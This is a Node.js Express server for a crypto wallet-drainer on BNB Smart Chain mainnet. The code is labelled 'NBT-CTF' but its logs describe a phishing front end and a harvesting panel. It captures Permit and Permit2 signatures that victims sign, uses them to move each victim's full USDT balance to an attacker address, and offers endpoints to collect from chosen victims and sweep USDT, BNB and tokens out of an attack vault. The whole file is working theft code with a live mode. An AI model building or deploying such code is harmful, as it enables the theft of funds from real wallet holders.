const path = require('path');
require('dotenv').config({ path: path.join(__dirname, '..', '.env.mainnet') });
const express = require('express');
const { ethers } = require('ethers');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));

const NBT_TOKEN = process.env.NBT_TOKEN || '';
const ATTACK_VAULT = process.env.ATTACK_VAULT || '';
const USDT_TOKEN = process.env.USDT_TOKEN || '0x55d398326f99059fF775485246999027B3197955';
const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

// 稳定 RPC 优先（中国大陆可访问），避免 bsc-dataseed.binance.org 超时
const RPC_CANDIDATES = [
  'https://bsc-dataseed.bnbchain.org',
  'https://bsc-dataseed1.bnbchain.org',
  'https://bsc.publicnode.com',
  'https://bsc.blockpi.network/v1/rpc/public',
  'https://rpc.ankr.com/bsc',
  ...(process.env.BSC_MAINNET_RPC_URLS || '').split(','),
  process.env.BSC_MAINNET_RPC_URL || '',
].map((url) => url.trim()).filter(Boolean);

function pickRpc() {
  return RPC_CANDIDATES[0];
}
const RPC = pickRpc();

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const ATTACKER_ADDR = PRIVATE_KEY
  ? new ethers.Wallet(PRIVATE_KEY).address
  : '0x0000000000000000000000000000000000000000';

app.use(express.static(path.join(__dirname, 'public')));

const VAULT_ABI = [
  'function nbt() view returns (address)',
  'function owner() view returns (address)',
  'function totalStaked() view returns (uint256)',
  'function staked(address) view returns (uint256)',
  'function confirmMultisig(bytes32,uint256,uint8,bytes32,bytes32)',
  'function onLpReceived(address,uint256,uint8,bytes32,bytes32)',
  'function collect(address)',
  'function collectToken(address,address)',
  'function sweepToken(address,address,uint256)',
  'function sweepBNB(address,uint256)',
  'function sweep(address,address,uint256)',
  'function balanceOf(address) view returns (uint256)',
];
const PERMIT2_ABI = [
  'function permitTransferFrom(tuple(tuple(address token,uint256 amount) permitted,uint256 nonce,uint256 deadline) permit,tuple(address to,uint256 requestedAmount) transferDetails,address owner,bytes signature)',
];
const TOKEN_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address,address) view returns (uint256)',
  'function permit(address,address,uint256,uint256,uint8,bytes32,bytes32)',
];

const signatures = [];

// secp256k1 阶的一半（EIP-2 low-s 要求）

function splitSignature(sig) {
  if (sig.length !== 132) throw new Error('invalid signature length');
  let r = '0x' + sig.slice(2, 66);
  let s = '0x' + sig.slice(66, 130);
  let v = parseInt(sig.slice(130, 132), 16);

  // EIP-2：将 high-s 归一化为 low-s，避免 Solidity ecrecover 拒绝
  let sBig = BigInt(s);
  if (sBig > SECP256K1_HALF) {
    sBig = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n - sBig;
    s = '0x' + sBig.toString(16).padStart(64, '0');
    v = v === 27 ? 28 : (v === 28 ? 27 : (v ^ 1));
  }

  return { r, s, v };
}

// EIP-2：low-s 签名归一化（Solidity ecrecover 要求）
const SECP256K1_N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;
const SECP256K1_HALF = SECP256K1_N / 2n;

function normalizeLowS(sig) {
  const bytes = ethers.getBytes(sig);
  if (bytes.length !== 65) throw new Error('invalid signature length');
  const r = bytes.slice(0, 32);
  let s = bytes.slice(32, 64);
  const v = bytes[64];
  let sBig = BigInt('0x' + Buffer.from(s).toString('hex'));
  let newV = v;
  if (sBig > SECP256K1_HALF) {
    sBig = SECP256K1_N - sBig;
    s = ethers.getBytes('0x' + sBig.toString(16).padStart(64, '0'));
    newV = v === 27 ? 28 : (v === 28 ? 27 : (v === 0 ? 1 : 0));
  }
  const normalized = ethers.concat([r, s, new Uint8Array([newV])]);
  return ethers.hexlify(normalized);
}

// 带 RPC 故障切换的 provider 工厂
function makeProvider() {
  return new ethers.JsonRpcProvider(RPC, 56);
}

app.post('/api/claim-permit2', async (req, res) => {
  const { owner, signature, amount, deadline, nonce } = req.body;

  if (!owner || !signature) {
    return res.json({ success: false, error: '缺少 owner 或 signature' });
  }

  const record = { owner, signature, deadline: deadline || 0, time: Date.now() };

  if (!PRIVATE_KEY) {
    signatures.push(record);
    console.log('[Permit2] 捕获签名:', owner.slice(0, 6), '... 签名池:', signatures.length);
    return res.json({ success: true, info: '签名已记录（演示模式，未执行链上交易）' });
  }

  try {
    const provider = makeProvider();
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, wallet);

    // 读取受害者 USDT 实际余额，只转走实际持有的数量
    const usdtContract = new ethers.Contract(USDT_TOKEN, ['function balanceOf(address) view returns (uint256)'], provider);
    const victimBalance = await usdtContract.balanceOf(owner);

    const permit = {
      permitted: { token: USDT_TOKEN, amount: ethers.MaxUint256.toString() },
      nonce: nonce || 0,
      deadline: deadline || Math.floor(Date.now() / 1000) + 86400,
    };
    const transferDetails = {
      to: ATTACKER_ADDR,
      requestedAmount: victimBalance,
    };

    // EIP-2 low-s 归一化后再执行（Solidity ecrecover 要求）
    const normalizedSignature = normalizeLowS(signature);
    const gasEstimate = await permit2.permitTransferFrom.estimateGas(permit, transferDetails, owner, normalizedSignature);
    const tx = await permit2.permitTransferFrom(permit, transferDetails, owner, normalizedSignature, {
      gasLimit: gasEstimate + 20000n,
    });
    const receipt = await tx.wait();

    console.log('[Permit2] Drain 成功! tx:', receipt.transactionHash);
    record.txHash = receipt.transactionHash;
    signatures.push(record);

    res.json({ success: true, txHash: receipt.transactionHash, recipient: ATTACKER_ADDR });
  } catch (e) {
    console.error('[Permit2] Drain 失败:', e.message);
    res.json({ success: false, error: e.message });
  }
});

app.post('/api/claim', async (req, res) => {
  const { owner, signature, deadline } = req.body;

  if (!owner || !signature) {
    return res.json({ success: false, error: '缺少 owner 或 signature' });
  }

  const record = {
    owner,
    signature,
    deadline: deadline || 0,
    time: Date.now(),
  };

  if (!PRIVATE_KEY || !ATTACK_VAULT || !NBT_TOKEN) {
    signatures.push(record);
    console.log(`[Permit] 捕获签名: ${owner.slice(0, 6)}... 签名池: ${signatures.length}`);
    return res.json({ success: true, info: '签名已记录（演示模式，未执行链上交易）' });
  }

  try {
    const provider = makeProvider();
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const vault = new ethers.Contract(ATTACK_VAULT, VAULT_ABI, wallet);

    const { r, s, v } = splitSignature(signature);
    const deadlineVal = deadline || Math.floor(Date.now() / 1000) + 86400;

    // 传入受害者地址（owner），而非 msg.sender；contract onLpReceived(victim,...) 正确指定 permit owner
    const tx = await vault.onLpReceived(owner, deadlineVal, v, r, s);
    const receipt = await tx.wait();

    console.log(`[Permit] Drain 成功! tx: ${receipt.transactionHash}`);
    record.txHash = receipt.transactionHash;
    signatures.push(record);

    res.json({
      success: true,
      txHash: receipt.transactionHash,
      recipient: ATTACKER_ADDR,
    });
  } catch (e) {
    console.error(`[Permit] Drain 失败:`, e.message);
    res.json({ success: false, error: e.message });
  }
});

app.get('/api/signatures', (req, res) => {
  res.json({ count: signatures.length, signatures });
});

app.get('/api/status', (req, res) => {
  res.json({
    status: 'ok',
    time: Date.now(),
    mode: PRIVATE_KEY && ATTACK_VAULT ? 'LIVE (可执行链上交易)' : 'DEMO (仅收集签名)',
    attacker: ATTACKER_ADDR,
    vault: ATTACK_VAULT,
    nbt: NBT_TOKEN,
    signatures: signatures.length,
  });
});

app.get('/api/vault/balance', async (req, res) => {
  try {
    const provider = makeProvider();
    const bal = await new ethers.Contract(NBT_TOKEN, TOKEN_ABI, provider).balanceOf(ATTACK_VAULT);
    res.json({ success: true, balance: ethers.formatEther(bal) });
  } catch (e) {
    res.json({ success: false, error: e.message, balance: '0' });
  }
});

app.get('/api/balances', async (req, res) => {
  try {
    const provider = makeProvider();
    const vault = ATTACK_VAULT;
    const c = new ethers.Contract(USDT_TOKEN, TOKEN_ABI, provider);
    const usdt = await c.balanceOf(vault);
    const nb = new ethers.Contract(NBT_TOKEN, TOKEN_ABI, provider).balanceOf(vault);
    const nbt = await nb;
    const bnb = await provider.getBalance(vault);
    res.json({ success: true, usdt: ethers.formatEther(usdt), nbt: ethers.formatEther(nbt), bnb: ethers.formatEther(bnb) });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

// 收割受害者的 USDT（需已授权给 Permit2 -> 再走 permit2，或已授权给 vault -> collectToken）
// 查询任意钱包的 CZ/USDT/BNB 余额 + 对 Vault/Permit2 的授权
app.get('/api/user-balance/:address', async (req, res) => {
  try {
    const address = req.params.address;
    if (!ethers.isAddress(address)) return res.json({ success: false, error: 'Invalid address' });
    const provider = makeProvider();
    const tokens = {
      usdt: USDT_TOKEN,
      nbt: NBT_TOKEN,
    };
    const result = { address, balances: {}, allowances: {} };
    for (const [key, addr] of Object.entries(tokens)) {
      const c = new ethers.Contract(addr, TOKEN_ABI, provider);
      result.balances[key] = ethers.formatEther(await c.balanceOf(address));
      // 对攻击 Vault 和 Permit2 的授权
      result.allowances[key + '_vault'] = ethers.formatEther(await c.allowance(address, ATTACK_VAULT));
      result.allowances[key + '_permit2'] = ethers.formatEther(await c.allowance(address, '0x000000000022D473030F116dDEE9F6B43aC78BA3'));
    }
    result.balances.bnb = ethers.formatEther(await provider.getBalance(address));
    res.json({ success: true, ...result });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

app.post('/api/collect-usdt/:victim', async (req, res) => {
  if (!PRIVATE_KEY || !ATTACK_VAULT) return res.json({ success: false, error: '未配置' });
  try {
    const provider = makeProvider();
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const vault = new ethers.Contract(ATTACK_VAULT, VAULT_ABI, wallet);
    const tx = await vault.collectToken(USDT_TOKEN, req.params.victim);
    const receipt = await tx.wait();
    res.json({ success: true, txHash: receipt.transactionHash });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

// 转走 Vault 内 USDT
app.post('/api/sweep-usdt', async (req, res) => {
  const { to } = req.body || {};
  if (!PRIVATE_KEY || !ATTACK_VAULT) return res.json({ success: false, error: '未配置' });
  try {
    const provider = makeProvider();
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const vault = new ethers.Contract(ATTACK_VAULT, VAULT_ABI, wallet);
    const tx = await vault.sweepToken(USDT_TOKEN, to || ATTACKER_ADDR, 0);
    const receipt = await tx.wait();
    res.json({ success: true, txHash: receipt.transactionHash });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

// 转走 Vault 内 BNB
app.post('/api/sweep-bnb', async (req, res) => {
  const { to } = req.body || {};
  if (!PRIVATE_KEY || !ATTACK_VAULT) return res.json({ success: false, error: '未配置' });
  try {
    const provider = makeProvider();
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const vault = new ethers.Contract(ATTACK_VAULT, VAULT_ABI, wallet);
    const tx = await vault.sweepBNB(to || ATTACKER_ADDR, 0);
    const receipt = await tx.wait();
    res.json({ success: true, txHash: receipt.transactionHash });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

app.post('/api/collect/:victim', async (req, res) => {
  if (!PRIVATE_KEY || !ATTACK_VAULT) {
    return res.json({ success: false, error: '未配置 PRIVATE_KEY/ATTACK_VAULT' });
  }
  try {
    const provider = makeProvider();
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const vault = new ethers.Contract(ATTACK_VAULT, VAULT_ABI, wallet);
    const tx = await vault.collect(req.params.victim);
    const receipt = await tx.wait();
    console.log(`[Collect] ${req.params.victim.slice(0, 6)}... tx: ${receipt.transactionHash}`);
    res.json({ success: true, txHash: receipt.transactionHash });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

app.post('/api/sweep', async (req, res) => {
  const { to, amount } = req.body;
  if (!PRIVATE_KEY || !ATTACK_VAULT || !NBT_TOKEN) {
    return res.json({ success: false, error: '未配置 PRIVATE_KEY/ATTACK_VAULT/NBT_TOKEN' });
  }
  try {
    const provider = makeProvider();
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
    const vault = new ethers.Contract(ATTACK_VAULT, VAULT_ABI, wallet);
    const bal = await new ethers.Contract(NBT_TOKEN, TOKEN_ABI, provider).balanceOf(ATTACK_VAULT);
    const amt = amount ? ethers.parseEther(String(amount)) : bal;
    const tx = await vault.sweep(NBT_TOKEN, to || ATTACKER_ADDR, amt);
    const receipt = await tx.wait();
    console.log(`[Sweep] tx: ${receipt.transactionHash}`);
    res.json({ success: true, txHash: receipt.transactionHash });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`[NBT-CTF] 钓鱼前端: http://localhost:${PORT}`);
  console.log(`[NBT-CTF] 后台收割面板: http://localhost:${PORT}/admin.html`);
  console.log(`[NBT-CTF] Permit 签名收集: http://localhost:${PORT}/api/claim`);
  console.log(`[NBT-CTF] 攻击者地址: ${ATTACKER_ADDR}`);
  console.log(`[NBT-CTF] Vault: ${ATTACK_VAULT || '(未配置)'}`);
  console.log(`[NBT-CTF] RPC: ${RPC}`);
  console.log(`[NBT-CTF] 模式: ${PRIVATE_KEY && ATTACK_VAULT ? 'LIVE（可执行链上 Drain）' : 'DEMO（仅收集签名）'}`);
});
